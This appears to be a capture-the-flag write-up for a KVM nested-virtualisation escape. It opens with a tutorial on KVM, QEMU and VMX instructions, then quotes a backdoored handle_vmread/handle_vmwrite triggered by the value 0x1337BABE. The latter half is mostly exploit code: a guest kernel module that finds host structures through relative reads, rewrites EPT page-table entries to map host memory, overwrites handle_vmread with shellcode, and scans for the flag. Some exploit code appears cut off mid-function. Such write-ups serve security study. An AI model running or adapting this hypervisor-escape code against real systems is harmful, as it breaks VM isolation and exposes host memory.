# KVM（Kernel-based Virtual Machine）


This section explains the concept of KVM (Kernel-based Virtual Machine), how it is implemented, and how it is used together with QEMU (Quick Emulator). Below are detailed explanations and examples:

### The Concept of KVM

KVM is a virtualization technology based on the Linux kernel that allows the Linux kernel to act as a virtual machine monitor (VMM) or hypervisor. The main purpose of KVM is to provide a unified interface that enables user-space programs to leverage hardware virtualization features (such as Intel's VMX and AMD's SVM) to create and manage virtual machines.

### The Implementation of KVM

KVM is implemented through a character device driver named `/dev/kvm`. This driver provides a series of ioctl (input/output control) commands for managing and controlling the state and behavior of virtual machines (VMs).

#### ioctl Commands

ioctl commands are a general-purpose mechanism for passing control information between user-space programs and kernel space. The KVM device driver provides many ioctl commands, which are used to configure the state of virtual machines, set register values, load the virtual machine's memory mappings, control the execution of the virtual machine, and so on.

- **KVM_SET_REGS**:
  - This command is used to set the register state of a virtual machine.
  - A user-space program can use this command to write general-purpose registers into the vcpu's general-purpose registers.

#### KVM API Documentation

- **API Documentation**:
  - More detailed information about the KVM API can be found in the Linux kernel documentation, specifically at: [https://docs.kernel.org/virt/kvm/api.html](https://docs.kernel.org/virt/kvm/api.html)
  - These documents describe in detail the available ioctl commands, parameter structures, and how to use them to control virtual machines.

### KVM Compilation Options

KVM can be integrated into the Linux kernel in different forms, depending on the choices made at compile time:

- **Built into the kernel**:
  - If `CONFIG_KVM_INTEL` is set to `y` in the kernel configuration, KVM will be compiled into the kernel image.
  - This means KVM becomes part of the kernel and can be used without loading additional modules.

- **Built as a kernel module**:
  - If `CONFIG_KVM_INTEL` is set to `m`, then KVM will be compiled as a loadable kernel module.
  - This means KVM functionality can be enabled or disabled by dynamically loading the module, providing greater flexibility.

### Combining QEMU with KVM

QEMU is a generic full-system emulator that can emulate multiple hardware architectures. When used together with KVM, QEMU can leverage the hardware acceleration provided by KVM to improve virtual machine performance.

- **Using KVM**:
  - When you start QEMU with the `--enable-kvm` parameter, QEMU will use the KVM API to run virtual machines.
  - This means QEMU will take advantage of hardware virtualization features rather than emulating everything purely in software.
  - The result is improved virtual machine performance and reduced CPU overhead.

- **Not using KVM**:
  - If the `--enable-kvm` parameter is not used, QEMU will run the virtual machine through pure software emulation.
  - Performance in this mode is usually lower, because QEMU has to emulate all hardware details in user space.


### Working Principle

1. **Initialization**: When KVM is started, it checks whether the hardware supports virtualization and initializes the necessary data structures.
2. **Creating a virtual machine**: A user-space application tells the kernel, via system calls, to create a new virtual machine instance.
3. **Configuring the virtual machine**: The application configures the virtual machine's hardware (such as memory size, number of CPUs, etc.) and loads the operating system image through a series of system calls.
4. **Running the virtual machine**: Once configuration is complete, the application can start the virtual machine. At this point, KVM takes over the virtual machine's operations and ensures they execute correctly.
5. **Privileged instruction handling**: When the virtual machine attempts to execute a privileged instruction, the instruction is trapped and passed to KVM, which either emulates it on the host or executes it directly on the hardware (if supported).





# Nested Virtualization (Creating a VM Inside a VM)

When we say "the processor can now execute VMX (virtualization) related instructions," it means the CPU has gained the ability to execute a series of special instructions dedicated to virtualization operations.

1. The VMX instruction set:
   - Intel processors have a special set of instructions dedicated to virtualization, called VMX (Virtual Machine Extensions) instructions.
   - These instructions include VMXON, VMXOFF, VMLAUNCH, VMRESUME, VMREAD, VMWRITE, and so on.

2. The role of these instructions:
   - These instructions allow an operating system or a virtual machine manager (such as VMware, VirtualBox) to create and manage virtual machines.
   - They provide hardware-level support, making virtualization more efficient and more secure.

3. The difference before and after enabling:
   - Before enabling the VMXE bit: if you try to execute these VMX instructions, the processor raises an exception (usually an invalid-opcode exception).
   - After enabling the VMXE bit: the processor can correctly recognize and execute these instructions.

4. A practical example:
   Suppose you want to run a virtual machine on your computer:
   - Before enabling VMXE: the VM software can only run virtual machines through pure software emulation, which is inefficient.
   - After enabling VMXE: the VM software can leverage these hardware instructions, greatly improving the virtual machine's running efficiency.

# A VM Executing vmx Instructions in a Nested Virtualization System (Operations on the VM Inside the VM)
[Usage of vmx instructions](https://wiki.osdev.org/VMX#VMCS)

1. Initial state:
   - L0: Host VMM (Hypervisor)
   - L1: The first-level virtual machine, running its own VMM
   - L2: The second-level virtual machine (optional)

2. L1 executes a VMX instruction:

   a. Instruction interception:
      - L1 attempts to execute a VMX instruction
      - The hardware detects that this is an instruction requiring special handling

   b. VM Exit to L0:
      - Control transfers from L1 to the L0 VMM
      - The L0 VMM obtains information about the reason for the VM Exit

   c. L0 VMM analysis:
      - Determines that the exit was caused by a VMX instruction
      - Checks L1's permissions and current state

   d. Emulated execution:
      - The L0 VMM does not execute the instruction directly
      - Instead, it emulates the effect of the instruction

   e. Virtual VMCS operation:
      - If the instruction involves a VMCS operation, L0 operates on the virtual VMCS assigned to L1
      - The virtual VMCS is a "shadow" or emulation of the actual VMCS

   f. State update:
      - L0 updates L1's virtual state so that it looks as if the instruction has been executed

   g. VM Entry back to L1:
      - After L0 finishes the emulation, it returns control to L1
      - L1 continues executing as if it had executed the VMX instruction directly

3. Special case - L1 creates L2:

   a. L1 executes VMLAUNCH/VMRESUME:
      - Used to launch or resume the L2 virtual machine

   b. L0 intercepts and emulates:
      - L0 creates or configures a new virtual VMCS for L2
      - Sets up the necessary nested virtualization structures

   c. Actual VM Entry:
      - L0 performs the real VM Entry into L2
      - L2 starts executing, believing it is managed directly by L1

4. L2 executes an operation that requires a VM Exit:

   a. Hardware VM Exit to L0:
      - Control goes directly to L0, bypassing L1

   b. L0 decision:
      - Decides whether L1 needs to be notified
      - If so, emulates a VM Exit from L2 to L1
      - Otherwise, L0 handles it itself and returns to L2

5. Optimizations and hardware support:
   - Modern processors provide features such as VMCS Shadowing
   - These features can reduce the number of VM Exits and improve performance

6. The loop continues:
   - This process repeats continuously, handling various operations of L1 and L2

The code above is used to check whether nested virtualization is in effect.

1. Guest Mode:
   In nested virtualization, "guest mode" refers to the situation where a virtual machine monitor (VMM) is running inside a virtual machine (VM). In other words, it is a virtual machine inside a virtual machine.

2. The levels of nested virtualization:
   - L0: The bottom-level hardware and the main virtual machine monitor
   - L1: A virtual machine running on L0, which is also a VMM
   - L2: A virtual machine running inside the L1 virtual machine

3. is_guest_mode(vcpu):
   This function checks whether the given virtual CPU (vcpu) is in guest mode. If it is, that means an L2 virtual machine is currently running.

4. VMCS (Virtual Machine Control Structure):
   The VMCS is the data structure used in Intel virtualization technology to control the behavior of a virtual machine.

5. vmcs12:
   In nested virtualization, vmcs12 represents the VMCS that the L1 VMM uses to manage the L2 virtual machine.

6. Code explanation:
   - If in guest mode (i.e., running an L2 virtual machine), use get_shadow_vmcs12(vcpu) to obtain the shadow VMCS.
   - If not in guest mode, use get_vmcs12(vcpu) to obtain the regular VMCS12.

static int handle_vmread(struct kvm_vcpu *vcpu)
{
	struct vmcs12 *vmcs12 = is_guest_mode(vcpu) ? get_shadow_vmcs12(vcpu)
						    : get_vmcs12(vcpu);
	unsigned long exit_qualification = vmx_get_exit_qual(vcpu);
	u32 instr_info = vmcs_read32(VMX_INSTRUCTION_INFO);
	struct vcpu_vmx *vmx = to_vmx(vcpu);
	struct x86_exception e;
	unsigned long field;
	u64 value;
	gva_t gva = 0;
	short offset;
	int len, r;

	if (!nested_vmx_check_permission(vcpu))
		return 1;

	/* Decode instruction info and find the field to read */
	field = kvm_register_read(vcpu, (((instr_info) >> 28) & 0xf));

	if (!nested_vmx_is_evmptr12_valid(vmx)) {
		/*
		 * In VMX non-root operation, when the VMCS-link pointer is INVALID_GPA,
		 * any VMREAD sets the ALU flags for VMfailInvalid.
		 */
		if (vmx->nested.current_vmptr == INVALID_GPA ||
		    (is_guest_mode(vcpu) &&
		     get_vmcs12(vcpu)->vmcs_link_pointer == INVALID_GPA))
			return nested_vmx_failInvalid(vcpu);

		offset = get_vmcs12_field_offset(field);
		if (offset < 0)
			return nested_vmx_fail(vcpu, VMXERR_UNSUPPORTED_VMCS_COMPONENT);

		if (!is_guest_mode(vcpu) && is_vmcs12_ext_field(field))
			copy_vmcs02_to_vmcs12_rare(vcpu, vmcs12);

		/* Read the field, zero-extended to a u64 value */
		value = vmcs12_read_any(vmcs12, field, offset);
	} else {
		/*
		 * Hyper-V TLFS (as of 6.0b) explicitly states, that while an
		 * enlightened VMCS is active VMREAD/VMWRITE instructions are
		 * unsupported. Unfortunately, certain versions of Windows 11
		 * don't comply with this requirement which is not enforced in
		 * genuine Hyper-V. Allow VMREAD from an enlightened VMCS as a
		 * workaround, as misbehaving guests will panic on VM-Fail.
		 * Note, enlightened VMCS is incompatible with shadow VMCS so
		 * all VMREADs from L2 should go to L1.
		 */
		if (WARN_ON_ONCE(is_guest_mode(vcpu)))
			return nested_vmx_failInvalid(vcpu);

		offset = evmcs_field_offset(field, NULL);
		if (offset < 0)
			return nested_vmx_fail(vcpu, VMXERR_UNSUPPORTED_VMCS_COMPONENT);

		/* Read the field, zero-extended to a u64 value */
		value = evmcs_read_any(nested_vmx_evmcs(vmx), field, offset);
	}

	/*
	 * Now copy part of this value to register or memory, as requested.
	 * Note that the number of bits actually copied is 32 or 64 depending
	 * on the guest's mode (32 or 64 bit), not on the given field's length.
	 */
	if (instr_info & BIT(10)) {
		kvm_register_write(vcpu, (((instr_info) >> 3) & 0xf), value);
	} else {
		len = is_64_bit_mode(vcpu) ? 8 : 4;
		if (get_vmx_mem_address(vcpu, exit_qualification,
					instr_info, true, len, &gva))
			return 1;
		/* _system ok, nested_vmx_check_permission has verified cpl=0 */
		r = kvm_write_guest_virt_system(vcpu, gva, &value, len, &e);
		if (r != X86EMUL_CONTINUE)
			return kvm_handle_memory_failure(vcpu, r, &e);
	}

	return nested_vmx_succeed(vcpu);
}

static int handle_vmwrite(struct kvm_vcpu *vcpu)
{
	struct vmcs12 *vmcs12 = is_guest_mode(vcpu) ? get_shadow_vmcs12(vcpu)
						    : get_vmcs12(vcpu);
	unsigned long exit_qualification = vmx_get_exit_qual(vcpu);
	u32 instr_info = vmcs_read32(VMX_INSTRUCTION_INFO);
	struct vcpu_vmx *vmx = to_vmx(vcpu);
	struct x86_exception e;
	unsigned long field;
	short offset;
	gva_t gva;
	int len, r;

	/*
	 * The value to write might be 32 or 64 bits, depending on L1's long
	 * mode, and eventually we need to write that into a field of several
	 * possible lengths. The code below first zero-extends the value to 64
	 * bit (value), and then copies only the appropriate number of
	 * bits into the vmcs12 field.
	 */
	u64 value = 0;

	if (!nested_vmx_check_permission(vcpu))
		return 1;

	/*
	 * In VMX non-root operation, when the VMCS-link pointer is INVALID_GPA,
	 * any VMWRITE sets the ALU flags for VMfailInvalid.
	 */
	if (vmx->nested.current_vmptr == INVALID_GPA ||
	    (is_guest_mode(vcpu) &&
	     get_vmcs12(vcpu)->vmcs_link_pointer == INVALID_GPA))
		return nested_vmx_failInvalid(vcpu);

	if (instr_info & BIT(10))
		value = kvm_register_read(vcpu, (((instr_info) >> 3) & 0xf));
	else {
		len = is_64_bit_mode(vcpu) ? 8 : 4;
		if (get_vmx_mem_address(vcpu, exit_qualification,
					instr_info, false, len, &gva))
			return 1;
		r = kvm_read_guest_virt(vcpu, gva, &value, len, &e);
		if (r != X86EMUL_CONTINUE)
			return kvm_handle_memory_failure(vcpu, r, &e);
	}

	field = kvm_register_read(vcpu, (((instr_info) >> 28) & 0xf));

	offset = get_vmcs12_field_offset(field);
	if (offset < 0)
		return nested_vmx_fail(vcpu, VMXERR_UNSUPPORTED_VMCS_COMPONENT);

	/*
	 * If the vCPU supports "VMWRITE to any supported field in the
	 * VMCS," then the "read-only" fields are actually read/write.
	 */
	if (vmcs_field_readonly(field) &&
	    !nested_cpu_has_vmwrite_any_field(vcpu))
		return nested_vmx_fail(vcpu, VMXERR_VMWRITE_READ_ONLY_VMCS_COMPONENT);

	/*
	 * Ensure vmcs12 is up-to-date before any VMWRITE that dirties
	 * vmcs12, else we may crush a field or consume a stale value.
	 */
	if (!is_guest_mode(vcpu) && !is_shadow_field_rw(field))
		copy_vmcs02_to_vmcs12_rare(vcpu, vmcs12);

	/*
	 * Some Intel CPUs intentionally drop the reserved bits of the AR byte
	 * fields on VMWRITE.  Emulate this behavior to ensure consistent KVM
	 * behavior regardless of the underlying hardware, e.g. if an AR_BYTE
	 * field is intercepted for VMWRITE but not VMREAD (in L1), then VMREAD
	 * from L1 will return a different value than VMREAD from L2 (L1 sees
	 * the stripped down value, L2 sees the full value as stored by KVM).
	 */
	if (field >= GUEST_ES_AR_BYTES && field <= GUEST_TR_AR_BYTES)
		value &= 0x1f0ff;

	vmcs12_write_any(vmcs12, field, offset, value);

	/*
	 * Do not track vmcs12 dirty-state if in guest-mode as we actually
	 * dirty shadow vmcs12 instead of vmcs12.  Fields that can be updated
	 * by L1 without a vmexit are always updated in the vmcs02, i.e. don't
	 * "dirty" vmcs12, all others go down the prepare_vmcs02() slow path.
	 */
	if (!is_guest_mode(vcpu) && !is_shadow_field_rw(field)) {
		/*
		 * L1 can read these fields without exiting, ensure the
		 * shadow VMCS is up-to-date.
		 */
		if (enable_shadow_vmcs && is_shadow_field_ro(field)) {
			preempt_disable();
			vmcs_load(vmx->vmcs01.shadow_vmcs);

			__vmcs_writel(field, value);

			vmcs_clear(vmx->vmcs01.shadow_vmcs);
			vmcs_load(vmx->loaded_vmcs->vmcs);
			preempt_enable();
		}
		vmx->nested.dirty_vmcs12 = true;
	}

	return nested_vmx_succeed(vcpu);
}

## Vulnerability Point

- handle_vmwrite reads the content of arch.db[0] in the struct kvm_vcpu; if it is 0x1337BABE, it then takes the content of arch.db[1] in the struct kvm_vcpu as dr, and then assigns the content of arch.db[2] in the struct kvm_vcpu to the content at the address struct vmcs12 *+8*dr.

  `  *（struct vmcs12 *+8*struct kvm_vcpu的arch.db[0]）=struct kvm_vcpu的arch.db[2]`
- handle_vmread reads the content of arch.db[0] in the struct kvm_vcpu; if it is 0x1337BABE, it then takes the content of arch.db[1] in the struct kvm_vcpu as dr, and then assigns the content at the address struct vmcs12 *+8*dr to arch.db[2] in the struct kvm_vcpu.

  ` struct kvm_vcpu的arch.db[2]= *（struct vmcs12 *+8*struct kvm_vcpu的arch.db[0]）`

This gives arbitrary read/write at any address relative to struct vmcs12 *, and this vmcs12 points to the host-side address of the vmcs we allocated inside the virtual machine. Why? Because this code handles the virtual machine executing vmx instructions, and the vmread instruction reads relevant fields from the vmcs of the controlled virtual machine; when the virtual machine executes vmread, it traps into the host's VMM, which then handles the virtual machine's vmread. So the vmcs here is naturally the VMCS of the virtual machine controlled by the (outer) virtual machine.

This is equivalent to arbitrary read/write on the host (but note that the struct kvm_vcpu *vcpu here still belongs to the virtual machine, not the virtual machine inside the virtual machine).


# Approach
## vmx-Related Initialization
[Usage of vmx instructions](https://wiki.osdev.org/VMX#VMCS)

In order to execute the vmread/vmwrite instructions, some setup is required. The vmread and vmwrite instructions are used to interact with the "Virtual Machine Control Structure" (VMCS); executing them inside a virtual machine means interacting with the nested virtual machine's VMCS. So the virtual machine must first enable VMX mode (nested virtualization) in order to do nested virtualization — without the nested virtual machine's VMCS, the vmread and vmwrite instructions naturally cannot be used.

First, allocate and initialize the VMXON Region and the VMCS Region corresponding to the nested virtual machine instance

```c
	vmxon_page = kmalloc(4096, GFP_KERNEL);
    memset(vmxon_page, 0, 4096);
    vmcs_page = kmalloc(4096, GFP_KERNEL);   
    memset(vmcs_page, 0, 4096);
    vmxon_page_pa = virt_to_phys(vmxon_page);
    vmcs_page_pa = virt_to_phys(vmcs_page);
    printk("vmxon_page %p --- vmxon_page_pa %p",vmxon_page,vmxon_page_pa);
    printk("vmcs_page %p --- vmcs_page_pa %p",vmcs_page,vmcs_page_pa);
```
Next is setting up the header information of vmxon_page and vmcs_page. The instruction for reading MSR registers is rdmsr, which uses eax, edx, and ecx as parameters: ecx holds the index of the MSR register value, while edx and eax hold the high 32 bits and low 32 bits of the result respectively. This instruction must be executed at ring0 privilege or in real-address mode; otherwise it triggers a #GP(0) exception. Specifying a reserved or unimplemented MSR address in ecx also raises an exception. Here, the vmcs_revision value is read according to the index and then stored at the beginning of vmxon_page and vmcs_page.

```c
    uint32_t a, d;
    asm volatile ("rdmsr" : "=a"(a), "=d"(d) : "c"(MSR_IA32_VMX_BASIC) : "memory");
    uint64_t vmcs_revision=a | ((uint64_t) d << 32);
    printk("vmcs_revision %p",vmcs_revision);
    *(uint64_t *)(vmxon_page) = vmcs_revision;
    *(uint64_t *)(vmcs_page) = vmcs_revision;
```


Next is enabling vmx mode: take bit 13 from the virtual machine's CR4 into rax, set that bit to 1, and then write it back to cr4. The purpose of this step is to turn on the virtualization switch in the CR4 register.


```c
    asm volatile (
    "movq %cr4, %rax\n\t"
    "bts $13, %rax\n\t"
    "movq %rax, %cr4"
);
```

> Note: The VMXON, VMCLEAR, and VMPTRLD instructions must point to the physical addresses of their respective regions.



The vmxon instruction takes the physical address of the allocated VMXON Region as its operand, indicating entry into VMX operation mode. The setna instruction uses the value of EFLAGS.CF to determine whether execution succeeded:
- setna means "set if not above"; it sets a byte based on the result of the vmxon instruction. If the vmxon instruction succeeds, it returns 0.
```c

  asm volatile (
    "vmxon %[pa]\n\t"
    "setna %[ret]"
    : [ret] "=rm" (vmxonret)
    : [pa] "m" (vmxon_page_pa)
    : "cc", "memory"
    );
    printk("vmxonret %p",vmxonret);


```

One thing to note here: enabling VMX virtualization requires turning on two "switches" — one is bit 13 of the Host CR4 register, and the other is the vmxon instruction.

> By the way, a note about GCC inline assembly: adding cc and memory to the clobbered list (the third colon) tells the compiler that the inline assembly modifies the cc (status register flags) and memory, so the compiler will no longer assume the corresponding values are still valid after this piece of inline assembly.

After the VMCS is loaded onto the logical CPU, the processor cannot access it through ordinary memory access instructions — doing so would cause a "processor error." The only available way to access it is through the vmread and vmwrite instructions.



## Relative Address Arbitrary Read/Write


Arbitrary read is done by setting db0 and db1; the read result is then in db2.

```c
static size_t read_relative(size_t offset_to_nest_vmcs)
{
    size_t value;
    size_t vmcs_field_value=0;
    size_t vmcs_field=0;
    size_t magic=0x1337BABE;
    asm("movq %0, %%db0"    ::"r" (magic));
    asm("movq %0, %%db1"    ::"r" (offset_to_nest_vmcs));
    asm volatile (
    "vmread %1, %0\n\t"  
    : "=r" (vmcs_field_value)
    : "r" (vmcs_field)
);
    asm("movq %%db2, %0" :"=r" (value));
    return value;

}
```

Arbitrary write is done by setting db0, db1, and db2, writing db2 to the target location.

```c
static void write_relative(size_t offset_to_nest_vmcs,size_t value)
{
    size_t vmcs_field_value=0;
    size_t vmcs_field=0;
    size_t magic=0x1337BABE;
    asm("movq %0, %%db0"    ::"r" (magic));
    asm("movq %0, %%db1"    ::"r" (offset_to_nest_vmcs));
    asm("movq %0, %%db2"    ::"r" (value));
    asm volatile (
    "vmwrite %1, %0\n\t"  
    : "=r" (vmcs_field_value)
    : "r" (vmcs_field)
);
    asm("movq %%db2, %0" :"=r" (value));

}
```

        if (neg_val == IDT_BASE) {
            found_val = neg_val;
            found_offset = neg_offset;
            break;
        }

        if (i < 0x20) {
            pr_info("vmcs12[%llx * 8] = %llx\n", pos_offset, pos_val);
            pr_info("vmcs12[%llx * 8] = %llx\n", neg_offset, neg_val);
        }
    }
    if (found_val == 0) {
        pr_info("[exp]: IDT NOT FOUND :(\n");
        *l1_vmcs_offset = 0;
        return 0;
    } else {
        pr_info("[exp]: Found IDT in l1 at offset %lld; value: %llx\n", found_offset, found_val);
        *l1_vmcs_offset = found_offset;
        return 1;
    }
}

static noinline int find_nested_vmx(uint64_t *nested_vmx_offset) {
    // the nested_vmx struct contains two known values --
    //     the guest phys addrs of the vmxon_ptr and current_vmptr
    // finding this structure allows us to read the `cached_vmcs12` pointer
    // which is the host virtual address of our vmcs, based on that we can
    // figure out where we are at in the l1's virtual address space

    unsigned long long pos_offset = 0, neg_offset = 0;
    uint64_t zero_val = 0, pos_val = 0, neg_val = 0;
    uint64_t found_val = 0, found_offset = 0;
    uint64_t i = 0;

    zero_val = read_guy(0ull);
    pr_info("vmcs12[0] = %llx\n", zero_val);
    zero_val = read_guy(1ull);
    pr_info("vmcs12[1] = %llx\n", zero_val);
    zero_val = read_guy(0ull);
    pr_info("vmcs12[0] = %llx\n", zero_val);

    for (i = 1; i < (0x4000*0x200); i += 2) {
        pos_offset = i;
        neg_offset = -i;
        // seen: 0xe8 0x28 0x68

        pos_val = read_guy(pos_offset);
        if (pos_val == vmptrld_page_pa && read_guy(pos_offset-2) == vmxon_page_pa) {
            found_val = pos_val;
            found_offset = pos_offset;
            break;
        }

        // in practice negative offset is rare/impossible?
        // commented out bc it keeps going too far and crashing
        //neg_val = read_guy(neg_offset);
        //if (neg_val == vmptrld_page_pa && read_guy(neg_offset-2) == vmxon_page_pa) {
        //    found_val = neg_val;
        //    found_offset = neg_offset;
        //    break;
        //}

        if (i > 0x1000 && i < 0x2000) {
            pr_info("vmcs12[%llx * 8] = %llx\n", pos_offset, pos_val);
            //pr_info("vmcs12[%llx * 8] = %llx\n", neg_offset, neg_val);
        }
    }
    if (found_val == 0) {
        pr_info("[exp]: L1 VMCS NOT FOUND :(\n");
        *nested_vmx_offset = 0;
        return 0;
    } else {
        pr_info("[exp]: Found vmcs in l1 at offset %lld; value: %llx\n", found_offset, found_val);
        *nested_vmx_offset = found_offset;
        return 1;
    }
}

static int proc_open(struct inode *inode, struct file *filep) {
    uint64_t l1_vmcs_offset = 0;
    uint64_t nested_vmx_offset = 0;
    uint64_t l2_vmcs_addr = 0;

    uint64_t eptp_value = 0;
    uint64_t ept_offset = 0;
    uint64_t ept_addr = 0;

    uint64_t pml4e_value = 0;
    uint64_t pml4e_offset = 0;
    uint64_t pml4e_addr = 0;

    uint64_t *pgde_page = 0;
    uint64_t pgde_page_pa = 0;

    uint64_t l2_entry = 0;

    uint64_t physbase = 0;
    uint64_t cr3 = 0;
    uint64_t *pgd = 0;

    uint64_t handle_vmread_page = 0;
    uint8_t *handle_vmread = 0;

    uint64_t i;

    if (!find_l1_vmcs(&l1_vmcs_offset)) {
        return 0; // not found
    }

    if (!find_nested_vmx(&nested_vmx_offset)) {
        return 0; // not found
    }

    l2_vmcs_addr = read_guy(nested_vmx_offset+1);
    pr_info("[exp]: YOU ARE HERE: %llx\n", l2_vmcs_addr);

    physbase = l2_vmcs_addr & ~0xfffffffull;
    pr_info("[exp]: probably physbase: %llx\n", l2_vmcs_addr & ~0xfffffff);

    eptp_value = read_guy(l1_vmcs_offset-50);
    pr_info("[exp]: eptp_value: %llx\n", eptp_value);

    ept_addr = physbase + (eptp_value & ~0xfffull);
    pr_info("[exp]: ept_addr: %llx\n", ept_addr);

    ept_offset = (ept_addr-l2_vmcs_addr) / 8;
    pr_info("[exp]: ept_offset: %llx\n", ept_offset);

    // read first entry in ept to get the PML4E
    pml4e_value = read_guy(ept_offset);
    pr_info("[exp]: pml4e_value: %llx\n", pml4e_value);

    pml4e_addr = physbase + (pml4e_value & ~0xfffull);
    pr_info("[exp]: pml4e_addr: %llx\n", pml4e_addr);

    pml4e_offset = (pml4e_addr-l2_vmcs_addr) / 8;
    pr_info("[exp]: pml4e_offset: %llx\n", pml4e_offset);

    // at 6GB will be an identity mapping of the l1 memory in l2
    write_guy(pml4e_offset + 6, 0x987);

    cr3 = read_cr3();
    pgd = (cr3 & ~0xfffull) + page_offset_base;
    pr_info("[exp]: pgd: %llx\n", pgd);

    pgde_page = kzalloc(0x1000, GFP_KERNEL);
    pgde_page_pa = virt_to_phys(pgde_page);

    // sticking the l1 mapping at the PGD entry the LDT remap usually goes at cuz why not
    pgd[272] = pgde_page_pa | 0x7;

    // huge and rwxp
    l2_entry = 0x180000000 | (1<<7) | 0x3;

    pgde_page[0] = l2_entry;

    // in THEORY I can access memory at 0xffff880000000000 now
    pr_info("TEST: %llx\n", *((uint64_t *)0xffff880000000000));

    // look for 0x3ec6780f to find the page where handle_vmread is at
    for (i = 0; i < (1024ull << 20); i += 0x1000) {
        unsigned int val = *((unsigned int *)(0xffff880000000df8 + i));

        // check the value and check if relocations were applied
        if (val == 0x3ec6780f && *((unsigned int *)(0xffff880000000df8 + 0xb + i)) != 0) {
            handle_vmread_page = 0xffff880000000000 + i;
            break;
        }
    }

    pr_info("found handle_vmread page at: %llx\n", handle_vmread_page);

    handle_vmread = handle_vmread_page + 0x4d0;
    pr_info("handle_vmread at: %llx\n", handle_vmread);

    // I don't want to figure out the address of nested_vmx_succeeded so pad with nops just up to that call
    // and make the instruction just after nested_vmx_succeeded returns be ret
    memset(handle_vmread, 0x90, 0x281);
    handle_vmread[0x286] = 0xc3;

    // -1 to remove null terminator
    memcpy(handle_vmread, shellcode, sizeof(shellcode)-1);

    // do it
    read_guy(0);

    // scan for flag in memory
    for (i = 0; i < 1024ull << 20; i+= 0x1000) {
        if (!memcmp(0xffff880000000000 + i, "corctf{", 7)) {
            pr_info("flag: %s\n", 0xffff880000000000 + i);
            break;
        }
    }

    return 0;
}

void __no_profile native_write_cr4(unsigned long val)
{
        unsigned long bits_changed = 0;
        asm volatile("mov %0,%%cr4": "+r" (val) : : "memory");
}

static inline int vmxon(uint64_t phys)
{
        uint8_t ret;

        __asm__ __volatile__ ("vmxon %[pa]; setna %[ret]"
                : [ret]"=rm"(ret)
                : [pa]"m"(phys)
                : "cc", "memory");

        return ret;
}

static inline int vmptrld(uint64_t vmcs_pa)
{
        uint8_t ret;

        __asm__ __volatile__ ("vmptrld %[pa]; setna %[ret]"
                : [ret]"=rm"(ret)
                : [pa]"m"(vmcs_pa)
                : "cc", "memory");

        return ret;
}


static inline uint64_t rdmsr_guy(uint32_t msr)
{
    uint32_t a, d;

    __asm__ __volatile__("rdmsr" : "=a"(a), "=d"(d) : "c"(msr) : "memory");

    return a | ((uint64_t) d << 32);
}


static inline uint32_t vmcs_revision(void)
{
    return rdmsr_guy(MSR_IA32_VMX_BASIC);
}

static int __init proc_init(void)
{
    void *vmxon_page, *vmptrld_page;
    struct proc_dir_entry *new;
    unsigned long cr4;
    int res;

    cr4 = native_read_cr4();
    cr4 |= 1ul << 13;
    native_write_cr4(cr4);

    pr_info("[exp]: set cr4 to %lx", cr4);
    vmxon_page = kzalloc(0x1000, GFP_KERNEL);
    vmptrld_page = kzalloc(0x1000, GFP_KERNEL);

    vmxon_page_pa = virt_to_phys(vmxon_page);
    vmptrld_page_pa = virt_to_phys(vmptrld_page);

    *(uint32_t *)(vmxon_page) = vmcs_revision();
    *(uint32_t *)(vmptrld_page) = vmcs_revision();

    res = vmxon(vmxon_page_pa);
    pr_info("[exp]: vmxon returned %d", res);

    res = vmptrld(vmptrld_page_pa);
    pr_info("[exp]: vmptrld returned %d", res);

    pr_info("[exp]: vmxon_pa %llx", vmxon_page_pa);
    pr_info("[exp]: vmptrld_pa %llx", vmptrld_page_pa);

    pr_info("page_offset_base: %lx\n", page_offset_base);

    new = proc_create("exp", 0777, NULL, &fops);
    pr_info("[exp]: init\n");
    return 0;
}

}
